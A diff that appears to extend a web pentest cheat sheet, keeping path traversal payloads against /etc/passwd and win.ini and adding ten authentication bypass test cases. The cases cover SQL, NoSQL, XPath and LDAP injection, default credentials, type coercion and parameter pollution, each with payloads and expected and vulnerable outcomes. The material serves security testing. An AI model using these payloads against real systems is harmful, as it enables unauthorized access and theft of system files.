@@ -6085,3 +6085,169 @@ GET /image?filename=../../../etc/passwd
 9. **Mangled Path** |    - Confuses filters by duplicating traversal sequences.     - Payload: `/.../.../.../.../.../.../.../.../.../etc/passwd`
 10. **Backslash Variant (Windows)** |     - Useful on Windows-based servers.     - Payload: `..\\..\\..\\windows\\win.ini`
 
+## Authentication Testcases
+**modular authentication test suite** in your preferred format — each case includes payloads, expected behavior, and vulnerable outcomes. Based on your GitHub methodology, this is ready for cheat sheets, scanner logic, or Burp/ZAP integration.
+
+**1. Default Credentials Enumeration**  
+Try common usernames and passwords.
+
+`text`  
+Payloads:  
+```text
+admin:admin  
+root:root  
+test:test  
+admin:password  
+user:123456  
+```
+
+✅ Expected: Default credentials disabled  
+❌ Vulnerable: Login successful with weak/default creds
+
+---
+
+**2. SQL Injection Authentication Bypass**  
+Inject SQL logic into login fields.
+
+`text`  
+Payloads:  
+```text
+' OR '1'='1  
+admin'--  
+' OR ''='  
+" OR "1"="1  
+```
+
+✅ Expected: Input sanitized and parameterized  
+❌ Vulnerable: Auth bypass via SQL injection
+
+---
+
+**3. NoSQL Injection Bypass**  
+Exploit loose type checking in NoSQL backends.
+
+`json`  
+Payload:  
+```json
+{
+  "username": "admin",
+  "password": { "$ne": null }
+}
+```
+
+✅ Expected: Strict type and schema validation  
+❌ Vulnerable: Auth bypass via NoSQL logic
+
+---
+
+**4. XPath Injection Bypass**  
+Inject XPath logic into XML-based login systems.
+
+`text`  
+Payloads:  
+```text
+' or '1'='1  
+' or contains(name(),'admin')  
+' or string-length(name())<10  
+```
+
+✅ Expected: Input sanitized  
+❌ Vulnerable: XPath logic executed
+
+---
+
+**5. LDAP Injection Bypass**  
+Inject LDAP filters to manipulate authentication.
+
+`text`  
+Payloads:  
+```text
+*)(uid=*))(|(uid=admin))  
+admin)(|(uid=*))  
+```
+
+✅ Expected: LDAP filters escaped  
+❌ Vulnerable: Auth bypass via LDAP logic
+
+---
+
+**6. JSON Parsing Abuse (Node.js)**  
+Exploit object coercion in Node.js backends.
+
+`json`  
+Payload:  
+```json
+{
+  "username": "admin",
+  "password": { "password": 1 }
+}
+```
+
+✅ Expected: Object parsing hardened  
+❌ Vulnerable: Login bypass due to coercion
+
+---
+
+**7. Content-Type Mismatch Abuse**  
+Send JSON body with `Content-Type: application/x-www-form-urlencoded`.
+
+`http`  
+Headers:  
+```http
+Content-Type: application/x-www-form-urlencoded
+```
+
+Body:  
+```json
+{ "username": "admin", "password": "admin" }
+```
+
+✅ Expected: Content-Type enforced  
+❌ Vulnerable: Parser mismatch leads to bypass
+
+---
+
+**8. Boolean Logic Abuse**  
+Use `true`, `false`, or `1=1` style payloads.
+
+`json`  
+Payload:  
+```json
+{
+  "username": "admin",
+  "password": true
+}
+```
+
+✅ Expected: Type and value validated  
+❌ Vulnerable: Boolean coercion accepted
+
+---
+
+**9. Parameter Pollution**  
+Send duplicate parameters to confuse backend logic.
+
+`http`  
+Payload:  
+```http
+username=admin&username=guest&password=admin
+```
+
+✅ Expected: First/last param enforced  
+❌ Vulnerable: Ambiguity leads to bypass
+
+---
+
+**10. Missing Parameter Handling**  
+Omit one or both login fields.
+
+`http`  
+Payloads:  
+```http
+username=admin  
+password=admin  
+(no parameters)
+```
+
+✅ Expected: All required fields enforced  
+❌ Vulnerable: Partial login accepted
